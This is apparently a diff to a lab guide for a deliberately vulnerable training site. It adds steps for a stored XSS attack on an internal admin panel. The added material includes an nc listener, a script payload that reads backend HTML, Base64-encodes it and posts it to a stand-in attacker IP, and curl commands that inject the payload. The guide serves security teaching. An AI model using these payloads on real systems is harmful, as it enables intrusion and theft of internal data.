@@ -195,9 +195,9 @@ Submit the contact form with:
 
 The `message` field is intentionally stored without sanitization in vulnerable mode.
 
-## Start The Collector
+## Optional Collector Script
 
-Run this on the attacker machine:
+Later in the lab, when you no longer want to capture requests by hand, you can use the bundled collector:
 
 ```bash
 python3 tools/collector.py
@@ -300,6 +300,133 @@ At this point you can state:
 - the privileged browser session attached to `backend.cross.fit` executed the payload
 - this is enough to confirm that the internal panel is vulnerable to stored XSS
 
+### Step 8: prepare a manual listener for raw HTTP requests
+
+For the next step you want to receive a `POST` body manually, without using the bundled collector yet.
+
+On the attacker machine, start a raw listener on port `9000`:
+
+```bash
+nc -lvnp 9000 | tee raw-http-request.txt
+```
+
+If your environment provides `ncat` instead of `nc`, use:
+
+```bash
+ncat -lvnp 9000 | tee raw-http-request.txt
+```
+
+Expected:
+
+- the terminal stays waiting for a connection
+- when the XSS fires, you will see the full HTTP request
+- the request body will contain the Base64-encoded HTML
+
+### Step 9: exfiltrate the unauthenticated front page of `backend.cross.fit`
+
+Now submit a payload that fetches the backend front page without sending the admin session cookie, encodes the returned HTML in Base64, and sends it to the attacker listener.
+
+Payload:
+
+```html
+<script>
+fetch('/', { credentials: 'omit' })
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+If attacker and lab are on the same host, use:
+
+```html
+<script>
+fetch('/', { credentials: 'omit' })
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://docker_host_gateway_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+Why `credentials: 'omit'` matters:
+
+- the XSS is executing in an authenticated admin session
+- if the payload reused that session, the backend front page could redirect to the dashboard
+- omitting credentials forces the fetch to retrieve the unauthenticated front page instead
+
+### Step 10: wait for the worker and inspect the raw HTTP request
+
+As before, the worker will render the stored message from `/admin/messages/next`.
+
+Expected in the attacker terminal:
+
+- `POST /internal-html`
+- HTTP headers
+- a blank line
+- the raw Base64 body at the end of the request
+
+### Step 11: decode the Base64 manually and save it as HTML
+
+Copy only the request body, that is, the Base64 content after the blank line, and decode it:
+
+```bash
+printf '%s' 'BASE64_AQUI' | base64 -d > backend-frontpage.html
+```
+
+Then open the saved file:
+
+```bash
+xdg-open backend-frontpage.html
+```
+
+Or inspect it directly:
+
+```bash
+rg -n "<title>|<form|username|password" backend-frontpage.html
+```
+
+### Step 12: validate the expected result
+
+The decoded HTML should correspond to the login page of `backend.cross.fit`.
+
+You should find indicators such as:
+
+- title similar to `Acceso interno`
+- a login form
+- `username`
+- `password`
+
+This demonstrates that the attacker can use the XSS not only to trigger a request, but also to read internal HTML and move that content outside the segmented backend.
+
+### Step 13: move to the scripted collector later
+
+Once this manual capture is understood and demonstrated, you can switch to:
+
+```bash
+python3 tools/collector.py
+```
+
+At that point the collector automates the parts you already proved by hand:
+
+- receiving `GET` and `POST`
+- showing the raw body
+- decoding Base64 automatically
+- making later payloads easier to inspect
+
 ## Payloads
 
 Replace:
@@ -328,6 +455,50 @@ Expected on the attacker machine with `python3 -m http.server 8000`:
 ```
 
 The `404` is fine. What matters is that the request reached the attacker-controlled server.
+
+### Backend front page exfiltration in Base64
+
+Use this after the probe request, when you want to retrieve the unauthenticated front page of `backend.cross.fit` and decode it locally:
+
+```html
+<script>
+fetch('/', { credentials: 'omit' })
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+Same-host validation shortcut:
+
+```html
+<script>
+fetch('/', { credentials: 'omit' })
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://docker_host_gateway_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+Expected:
+
+- the attacker-side listener receives `POST /internal-html`
+- the raw body is Base64
+- decoding it yields the login page HTML of `backend.cross.fit`
 
 ### Visual XSS
 
@@ -404,6 +575,16 @@ curl -i -X POST http://cross.fit/contact \
   -d "email=xss-probe@example.com" \
   -d "phone=099000009" \
   --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
+```
+
+### Backend front page exfiltration in Base64
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Frontpage" \
+  -d "email=xss-frontpage@example.com" \
+  -d "phone=099000011" \
+  --data-urlencode "message=<script>fetch('/', { credentials: 'omit' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
 ```
 
 ### HTML exfiltration payload
